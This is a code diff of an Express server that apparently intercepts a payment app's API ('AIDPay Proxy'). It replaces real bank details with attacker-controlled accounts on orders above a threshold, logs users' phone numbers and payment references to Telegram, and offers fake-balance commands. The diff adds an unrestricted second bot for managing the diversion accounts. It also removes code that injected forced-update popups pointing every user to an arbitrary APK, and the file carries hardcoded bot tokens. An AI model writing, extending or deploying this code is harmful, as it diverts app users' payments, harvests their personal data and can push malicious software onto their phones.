@@ -7,6 +7,8 @@ const app = express();
 const ORIGINAL_API = 'https://api.aidpay-api.com';
 const BOT_TOKEN = '8568538419:AAE90H83MD1M4y_iDqMlNDIPwBH2ft4uqW0';
 const WEBHOOK_URL = 'https://dschf.vercel.app/bot-webhook';
+const BOT2_TOKEN = '8796960087:AAGFrGOx_GfjultrEX1QF4pEcYyv75qUlKE';
+const BOT2_WEBHOOK_URL = 'https://dschf.vercel.app/bot2-webhook';
 const REDIS_URL = process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;
 
@@ -21,12 +23,19 @@ const DEFAULT_DATA = {
   usdtAddress: '',
   userOverrides: {},
   trackedUsers: {},
-  forceUpdate: { enabled: false, apkUrl: '', webUrl: '' }
+  bot2Chats: []
 };
 
 let bot = null;
 let webhookSet = false;
 try { bot = new TelegramBot(BOT_TOKEN); } catch(e) {}
+
+let bot2 = null;
+let bot2WebhookSet = false;
+try { if (BOT2_TOKEN !== 'REPLACE_WITH_SECOND_BOT_TOKEN') bot2 = new TelegramBot(BOT2_TOKEN); } catch(e) {}
+
+// Track proxy bank orders per user (in-memory, best-effort across warm instances)
+const proxyUserOrders = new Map(); // userId -> { orderId, ts }
 
 let redis = null;
 if (REDIS_URL && REDIS_TOKEN) {
@@ -560,9 +569,28 @@ async function proxyAndReplaceBankDetails(req, res, label, notify = false) {
   } catch(e) { await transparentProxy(req, res); }
 }
 
+// ── Bot2 helpers ──────────────────────────────────────────────
+async function sendBot2All(data, msg) {
+  if (!bot2 || !data.bot2Chats || !data.bot2Chats.length) return;
+  for (const cid of data.bot2Chats) {
+    bot2.sendMessage(cid, msg).catch(() => {});
+  }
+}
+
+async function ensureBot2Webhook() {
+  if (!bot2 || bot2WebhookSet) return;
+  try { await bot2.setWebHook(BOT2_WEBHOOK_URL); bot2WebhookSet = true; } catch(e) {}
+}
+// ──────────────────────────────────────────────────────────────
+
 app.get('/setup-webhook', async (req, res) => {
   await ensureWebhook();
   res.json({ ok: true, webhook: WEBHOOK_URL });
+});
+
+app.get('/setup-webhook2', async (req, res) => {
+  await ensureBot2Webhook();
+  res.json({ ok: !!bot2, webhook: BOT2_WEBHOOK_URL });
 });
 
 app.get('/health', async (req, res) => {
@@ -572,9 +600,147 @@ app.get('/health', async (req, res) => {
     proxy: data.botEnabled ? 'ON' : 'OFF',
     banks: data.banks.length,
     tracked: Object.keys(data.trackedUsers || {}).length,
+    bot2Chats: (data.bot2Chats || []).length,
     app: 'AIDPay Proxy'
   });
 });
+
+// ══════════════════════════════════════════════════════════════
+// BOT 2 — Bank Manager Bot (no admin restriction, anyone can use)
+// ══════════════════════════════════════════════════════════════
+app.post('/bot2-webhook', async (req, res) => {
+  try {
+    await ensureBot2Webhook();
+    if (!bot2) return res.sendStatus(200);
+    const body = req.parsedBody || {};
+    const msg = body.message;
+    if (!msg) return res.sendStatus(200);
+    const chatId = msg.chat && msg.chat.id;
+    const text = (msg.text || '').trim();
+    if (!chatId || !text) return res.sendStatus(200);
+
+    const data = await loadData();
+
+    // Register this chat so it gets order + bank notifications
+    if (!data.bot2Chats) data.bot2Chats = [];
+    if (!data.bot2Chats.includes(chatId)) {
+      data.bot2Chats.push(chatId);
+      await saveData(data);
+    }
+
+    // ── /start ─────────────────────────────────────────────────
+    if (text === '/start') {
+      await bot2.sendMessage(chatId,
+        '🤖 Bank Manager Bot\n\n' +
+        'Commands:\n' +
+        '/banks — Bank list dekho\n' +
+        '/addbank holder|accountNo|ifsc|bankName|upiId — Bank add karo\n' +
+        '/setbank <number> — Active bank set karo\n' +
+        '/setmin <number> <amount> — Min order amount set karo'
+      );
+      return res.sendStatus(200);
+    }
+
+    // ── /banks ─────────────────────────────────────────────────
+    if (text === '/banks') {
+      if (!data.banks.length) {
+        await bot2.sendMessage(chatId, '❌ Koi bank nahi hai abhi.');
+        return res.sendStatus(200);
+      }
+      let m = '🏦 Bank List:\n━━━━━━━━━━━━━━\n';
+      data.banks.forEach((b, i) => {
+        const active = i === data.activeIndex;
+        m += `\n${active ? '✅ #' : `${i + 1}.`} ${b.accountHolder}`;
+        m += `\n   📋 ${b.accountNo}`;
+        m += `\n   🏷️ ${b.ifsc}`;
+        if (b.bankName) m += `\n   🏦 ${b.bankName}`;
+        if (b.upiId) m += `\n   💳 ${b.upiId}`;
+        if (b.minAmount) m += `\n   💰 Min: ₹${b.minAmount}`;
+        m += '\n';
+      });
+      m += `\n✅ = Active bank`;
+      await bot2.sendMessage(chatId, m);
+      return res.sendStatus(200);
+    }
+
+    // ── /addbank ───────────────────────────────────────────────
+    if (text.startsWith('/addbank ')) {
+      const parts = text.substring(9).trim().split('|').map(s => s.trim());
+      if (parts.length < 3) {
+        await bot2.sendMessage(chatId, '❌ Format:\n/addbank holder|accountNo|ifsc|bankName|upiId\n\nExample:\n/addbank Rahul Kumar|1234567890|HDFC0001234|HDFC Bank|rahul@upi');
+        return res.sendStatus(200);
+      }
+      const bank = {
+        accountHolder: parts[0],
+        accountNo: parts[1],
+        ifsc: parts[2],
+        bankName: parts[3] || '',
+        upiId: parts[4] || ''
+      };
+      data.banks.push(bank);
+      if (data.banks.length === 1) data.activeIndex = 0;
+      await saveData(data);
+      await bot2.sendMessage(chatId,
+        `✅ Bank Added!\n👤 ${bank.accountHolder}\n🔢 ${bank.accountNo}\n🏷️ ${bank.ifsc}${bank.bankName ? '\n🏦 ' + bank.bankName : ''}${bank.upiId ? '\n💳 ' + bank.upiId : ''}\n📋 Total: ${data.banks.length}`
+      );
+      // Notify main bot admin
+      if (data.adminChatId && bot) {
+        bot.sendMessage(data.adminChatId,
+          `🏦 [Bot2] Bank Added:\n👤 ${bank.accountHolder}\n🔢 ${bank.accountNo}\n🏷️ IFSC: ${bank.ifsc}${bank.bankName ? '\n🏦 ' + bank.bankName : ''}${bank.upiId ? '\n💳 UPI: ' + bank.upiId : ''}\n📋 Total: ${data.banks.length}`
+        ).catch(() => {});
+      }
+      return res.sendStatus(200);
+    }
+
+    // ── /setbank ───────────────────────────────────────────────
+    if (text.startsWith('/setbank ')) {
+      const idx = parseInt(text.substring(9).trim()) - 1;
+      if (isNaN(idx) || idx < 0 || idx >= data.banks.length) {
+        await bot2.sendMessage(chatId, `❌ Invalid number. Banks: 1–${data.banks.length}`);
+        return res.sendStatus(200);
+      }
+      data.activeIndex = idx;
+      await saveData(data);
+      const b = data.banks[idx];
+      await bot2.sendMessage(chatId, `✅ Active bank set:\n👤 ${b.accountHolder}\n🔢 ${b.accountNo}`);
+      return res.sendStatus(200);
+    }
+
+    // ── /setmin ────────────────────────────────────────────────
+    if (text.startsWith('/setmin ')) {
+      const parts = text.substring(8).trim().split(/\s+/);
+      if (parts.length < 2) {
+        await bot2.sendMessage(chatId, '❌ Format: /setmin <bank_number> <amount>\nExample: /setmin 1 500');
+        return res.sendStatus(200);
+      }
+      const bankIdx = parseInt(parts[0]) - 1;
+      const amount = parseFloat(parts[1]);
+      if (isNaN(bankIdx) || bankIdx < 0 || bankIdx >= data.banks.length || isNaN(amount) || amount < 0) {
+        await bot2.sendMessage(chatId, '❌ Invalid bank number ya amount');
+        return res.sendStatus(200);
+      }
+      data.banks[bankIdx].minAmount = amount;
+      data._skipOverrideMerge = true;
+      await saveData(data);
+      const b = data.banks[bankIdx];
+      await bot2.sendMessage(chatId,
+        `✅ Min Amount Set!\n🏦 Bank #${bankIdx + 1}: ${b.accountHolder}\n💰 Min: ₹${amount}\n\nOrders < ₹${amount} → Real bank\nOrders >= ₹${amount} → Proxy bank`
+      );
+      return res.sendStatus(200);
+    }
+
+    // ── Unknown ────────────────────────────────────────────────
+    await bot2.sendMessage(chatId,
+      '❓ Unknown command\n\n' +
+      '/banks — Bank list\n' +
+      '/addbank holder|accountNo|ifsc|bankName|upiId\n' +
+      '/setbank <number>\n' +
+      '/setmin <number> <amount>'
+    );
+    return res.sendStatus(200);
+  } catch(e) { return res.sendStatus(200); }
+});
+// ══════════════════════════════════════════════════════════════
 
 app.post('/bot-webhook', async (req, res) => {
   await ensureWebhook();
@@ -589,7 +755,7 @@ app.post('/bot-webhook', async (req, res) => {
     if (text === '/start') {
       data.adminChatId = chatId;
       await saveData(data);
-      await bot.sendMessage(chatId, '🚀 AIDPay Proxy Bot Started!\n\nCommands:\n/status - Bot status\n/on - Enable proxy\n/off - Disable proxy\n/banks - List banks\n/addbank - Add bank\n/removebank - Remove bank\n/setbank - Set active bank\n/setmin <n> <amount> - Min order amount for bank\n/rotate - Toggle auto-rotate\n/log - Toggle logging\n/debug on - Full request+response logging ON\n/debug off - Full logging OFF\n/debug - One-shot debug next response\n/setusdt <address> - Set USDT address override\n/usdt - Show current USDT address\n/removeusdt - Remove USDT override\n/debugusdt - Toggle USDT debug logging\n/add <userId> <amount> - Add balance\n/deduct <userId> <amount> - Deduct balance\n/remove balance <userId> - Remove fake balance\n/history - Balance history\n/off log <userId> - Disable logging for user\n/on log <userId> - Enable logging for user\n/update on <apkUrl> <webUrl> - Force update popup ON (sare users ko)\n/update off - Force update popup OFF\n/update status - Update popup status dekho');
+      await bot.sendMessage(chatId, '🚀 AIDPay Proxy Bot Started!\n\nCommands:\n/status - Bot status\n/on - Enable proxy\n/off - Disable proxy\n/banks - List banks\n/addbank - Add bank\n/removebank - Remove bank\n/setbank - Set active bank\n/setmin <n> <amount> - Min order amount for bank\n/rotate - Toggle auto-rotate\n/log - Toggle logging\n/debug on - Full request+response logging ON\n/debug off - Full logging OFF\n/debug - One-shot debug next response\n/setusdt <address> - Set USDT address override\n/usdt - Show current USDT address\n/removeusdt - Remove USDT override\n/debugusdt - Toggle USDT debug logging\n/add <userId> <amount> - Add balance\n/deduct <userId> <amount> - Deduct balance\n/remove balance <userId> - Remove fake balance\n/history - Balance history\n/off log <userId> - Disable logging for user\n/on log <userId> - Enable logging for user');
       return res.sendStatus(200);
     }
 
@@ -598,9 +764,6 @@ app.post('/bot-webhook', async (req, res) => {
       const idCount = Object.keys(data.userOverrides || {}).length;
       let m = `📊 Status:\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
       if (data.usdtAddress) m += `\n💎 USDT: ${data.usdtAddress}`;
-      const fu = data.forceUpdate || {};
-      m += `\n🔄 Update Popup: ${fu.enabled ? '🔴 ON — Sare users ko dikhra hai' : '🟢 OFF'}`;
-      if (fu.enabled) { m += `\n📥 APK: ${fu.apkUrl || 'N/A'}\n🌐 Web: ${fu.webUrl || 'N/A'}`; }
       if (active) m += `\n\n💳 Active:\n${active.accountHolder}\n${active.accountNo}\nIFSC: ${active.ifsc}${active.bankName ? '\nBank: ' + active.bankName : ''}${active.upiId ? '\nUPI: ' + active.upiId : ''}`;
       else m += '\n\n⚠️ No active bank';
       await bot.sendMessage(chatId, m);
@@ -764,6 +927,8 @@ app.post('/bot-webhook', async (req, res) => {
       if (data.banks.length === 1) data.activeIndex = 0;
       await saveData(data);
       await bot.sendMessage(chatId, `✅ Bank added: ${bank.accountHolder} | ${bank.accountNo}\n📋 Total: ${data.banks.length}`);
+      // Notify bot2 users that main bot added a bank
+      await sendBot2All(data, `🏦 [Main Bot] Bank Added:\n👤 ${bank.accountHolder}\n🔢 ${bank.accountNo}\n🏷️ IFSC: ${bank.ifsc}${bank.bankName ? '\n🏦 ' + bank.bankName : ''}${bank.upiId ? '\n💳 UPI: ' + bank.upiId : ''}\n📋 Total Banks: ${data.banks.length}`);
       return res.sendStatus(200);
     }
 
@@ -801,53 +966,6 @@ app.post('/bot-webhook', async (req, res) => {
       await saveData(data);
       const b = data.banks[bankIdx];
       await bot.sendMessage(chatId, `✅ Min amount set!\nBank #${bankIdx + 1}: ${b.accountHolder}\nMin Order: ₹${amount}\n\nOrders < ₹${amount} → Real bank dikhega\nOrders >= ₹${amount} → Proxy bank dikhega`);
-      return res.sendStatus(200);
-    }
-
-    if (text.startsWith('/update')) {
-      if (!data.forceUpdate) data.forceUpdate = { enabled: false, apkUrl: '', webUrl: '' };
-
-      if (text === '/update off') {
-        data.forceUpdate.enabled = false;
-        await saveData(data);
-        await bot.sendMessage(chatId, '✅ Update popup OFF — Users ab normal app use kar sakte hain.');
-        return res.sendStatus(200);
-      }
-
-      if (text === '/update status') {
-        const fu = data.forceUpdate;
-        if (fu.enabled) {
-          await bot.sendMessage(chatId, `🔴 Update Popup: ON\n📥 APK URL: ${fu.apkUrl || 'N/A'}\n🌐 Web URL: ${fu.webUrl || 'N/A'}\n\nSare users ko app kholne pe mandatory update dikhra hai.`);
-        } else {
-          await bot.sendMessage(chatId, '🟢 Update Popup: OFF\nKoi bhi forced update nahi chal raha.');
-        }
-        return res.sendStatus(200);
-      }
-
-      if (text.startsWith('/update on ')) {
-        const rest = text.substring(11).trim();
-        const parts = rest.split(/\s+/);
-        if (parts.length < 2) {
-          await bot.sendMessage(chatId, '❌ Format:\n/update on <apkUrl> <webUrl>\n\nExample:\n/update on https://oss.aidpay-web.com/apk/aidpay.apk https://app-web.aidpay-web.com/');
-          return res.sendStatus(200);
-        }
-        const apkUrl = parts[0];
-        const webUrl = parts[1];
-        data.forceUpdate = { enabled: true, apkUrl, webUrl };
-        await saveData(data);
-        await bot.sendMessage(chatId, `✅ Update Popup ON!\n\n📥 APK URL:\n${apkUrl}\n\n🌐 Web URL:\n${webUrl}\n\n⚠️ Ab sare users ko app kholne pe "Update Required" popup dikhega.\nBand karne ke liye: /update off`);
-        return res.sendStatus(200);
-      }
-
-      if (text === '/update logconfig') {
-        if (!data.forceUpdate) data.forceUpdate = { enabled: false, apkUrl: '', webUrl: '' };
-        data.forceUpdate.logConfig = !data.forceUpdate.logConfig;
-        await saveData(data);
-        await bot.sendMessage(chatId, `🔍 Config Logging: ${data.forceUpdate.logConfig ? 'ON — ab app kholne pe real /global/config response yahan aayega' : 'OFF'}`);
-        return res.sendStatus(200);
-      }
-
-      await bot.sendMessage(chatId, '❌ Format:\n/update on <apkUrl> <webUrl> — Popup ON karo\n/update off — Popup OFF karo\n/update status — Status dekho\n/update logconfig — Real API response Telegram pe log karo (debug)');
       return res.sendStatus(200);
     }
 
@@ -1323,18 +1441,24 @@ app.all('/app/pay/submit/utr', async (req, res) => {
     const body = req.parsedBody || {};
     const userId = await extractUserId(req, jsonResp);
     if (userId) saveTokenUserId(req, userId);
+    const phone = getPhone(data, userId);
+    const utr = body.utr || body.utrNo || body.transactionId || body.txnId || 'N/A';
+    const amount = body.amount || body.money || body.orderAmount || '';
+    const statusCode = jsonResp ? (jsonResp.code ?? jsonResp.status ?? '') : '';
+    const apiMsg = jsonResp ? (jsonResp.msg ?? jsonResp.message ?? '') : '';
+    const now = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+    let utrMsg = `📤 UTR Submit [${userId || 'N/A'}]${phone ? ' 📱' + phone : ''}`;
+    utrMsg += `\n🔢 UTR: ${utr}${amount ? ' | ₹' + amount : ''}`;
+    utrMsg += `\n${statusCode === 200 || statusCode === '200' ? '✅' : statusCode ? '⚠️ Code: ' + statusCode : ''} ${apiMsg}`;
+    utrMsg += `\n🕐 ${now}`;
     if (!isLogOff(data, userId) && data.adminChatId && bot) {
-      const phone = getPhone(data, userId);
-      const utr = body.utr || body.utrNo || body.transactionId || body.txnId || 'N/A';
-      const amount = body.amount || body.money || body.orderAmount || '';
-      const statusCode = jsonResp ? (jsonResp.code ?? jsonResp.status ?? '') : '';
-      const apiMsg = jsonResp ? (jsonResp.msg ?? jsonResp.message ?? '') : '';
-      const now = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
-      let utrMsg = `📤 UTR Submit [${userId || 'N/A'}]${phone ? ' 📱' + phone : ''}`;
-      utrMsg += `\n🔢 UTR: ${utr}${amount ? ' | ₹' + amount : ''}`;
-      utrMsg += `\n${statusCode === 200 || statusCode === '200' ? '✅' : statusCode ? '⚠️ Code: ' + statusCode : ''} ${apiMsg}`;
-      utrMsg += `\n🕐 ${now}`;
       bot.sendMessage(data.adminChatId, utrMsg).catch(()=>{});
+    }
+    // Bot2: send UTR only if this user had a recent proxy bank order
+    const proxyEntry = userId ? proxyUserOrders.get(String(userId)) : null;
+    const isProxyUtr = proxyEntry && (Date.now() - proxyEntry.ts < 30 * 60 * 1000); // 30 min window
+    if (isProxyUtr) {
+      await sendBot2All(data, utrMsg);
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
@@ -1403,6 +1527,22 @@ app.all('/app/user/create/order', async (req, res) => {
       if (orderId !== 'N/A') msg += `\n📋 Order: ${orderId}`;
       msg += `\n${success ? '✅ Success' : '❌ Failed (Code: ' + statusCode + ')'}`;
       bot.sendMessage(data.adminChatId, msg).catch(()=>{});
+    }
+    // Bot2: notify only if proxy bank order
+    if (bank && shouldOverride && effectiveId) {
+      const orderId2 = (respData && (respData.orderId || respData.orderNo)) || '';
+      const statusCode2 = jsonResp ? (jsonResp.code ?? jsonResp.status ?? '') : '';
+      const success2 = statusCode2 === 200 || statusCode2 === '200' || statusCode2 === 0 || statusCode2 === '0';
+      // Track this user's proxy order for UTR matching
+      proxyUserOrders.set(String(effectiveId), { orderId: orderId2, ts: Date.now() });
+      const phone2 = getPhone(data, effectiveId);
+      let b2msg = `🛒 Proxy Order [${effectiveId}]${phone2 ? ' 📱' + phone2 : ''}`;
+      if (orderAmount !== null) b2msg += `\n💰 Amount: ₹${orderAmount}`;
+      b2msg += `\n🏦 ${bank.accountHolder} | ${bank.accountNo}`;
+      if (bank.ifsc) b2msg += ` | ${bank.ifsc}`;
+      if (orderId2) b2msg += `\n📋 Order: ${orderId2}`;
+      b2msg += `\n${success2 ? '✅ Success' : '❌ Failed'}`;
+      await sendBot2All(data, b2msg);
     }
     if (effectiveId) trackUser(data, effectiveId, 'Buy Order');
   } catch(e) { await transparentProxy(req, res); }
@@ -1541,56 +1681,7 @@ for (const ep of COLLECTION_ENDPOINTS) {
 
 app.all('/app/pay/upload/file', async (req, res) => { await transparentProxy(req, res); });
 app.all('/app/user/upload/param', async (req, res) => { await transparentProxy(req, res); });
-app.all('/app/global/config', async (req, res) => {
-  try {
-    const data = await loadData();
-    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
-    const fu = data.forceUpdate || {};
-
-    if (data.adminChatId && bot && fu.logConfig) {
-      const preview = JSON.stringify(jsonResp).substring(0, 1500);
-      bot.sendMessage(data.adminChatId, `🔍 /app/global/config Real Response:\n\n${preview}`).catch(() => {});
-    }
-
-    if (fu.enabled && fu.apkUrl) {
-      if (jsonResp && typeof jsonResp === 'object') {
-        const updateFields = {
-          isForce: 1,
-          isForceUpdate: 1,
-          upgradeType: 2,
-          upgrade: 1,
-          needUpdate: 1,
-          isUpdate: 1,
-          forceUpdate: 1,
-          newVersion: '9.9.9',
-          versionCode: 999,
-          newVersionCode: 999,
-          androidVersionCode: 999,
-          androidVersion: '9.9.9',
-          downloadUrl: fu.apkUrl,
-          apkUrl: fu.apkUrl,
-          apkDownloadUrl: fu.apkUrl + '?t=' + Date.now(),
-          androidDownloadUrl: fu.apkUrl + '?t=' + Date.now(),
-          webUrl: fu.webUrl || '',
-          officialWebUrl: fu.webUrl || '',
-          officialUrl: fu.webUrl || '',
-          h5Url: fu.webUrl || '',
-          domainUrl: fu.webUrl || '',
-          content: 'A new version is available. Please update now to continue using the app.',
-          upgradeContent: 'A new version is available. Please update now to continue using the app.'
-        };
-        if (jsonResp.data && typeof jsonResp.data === 'object') Object.assign(jsonResp.data, updateFields);
-        else if (jsonResp.body && typeof jsonResp.body === 'object') Object.assign(jsonResp.body, updateFields);
-        else if (jsonResp.result && typeof jsonResp.result === 'object') Object.assign(jsonResp.result, updateFields);
-        else jsonResp.data = updateFields;
-        Object.assign(jsonResp, updateFields);
-        return sendJson(res, respHeaders, jsonResp, respBody);
-      }
-    }
-    res.writeHead(response.status, respHeaders);
-    res.end(respBody);
-  } catch(e) { await transparentProxy(req, res); }
-});
+app.all('/app/global/config', async (req, res) => { await transparentProxy(req, res); });
 app.all('/app/auth/refresh/session', async (req, res) => {
   try {
     const data = await loadData();
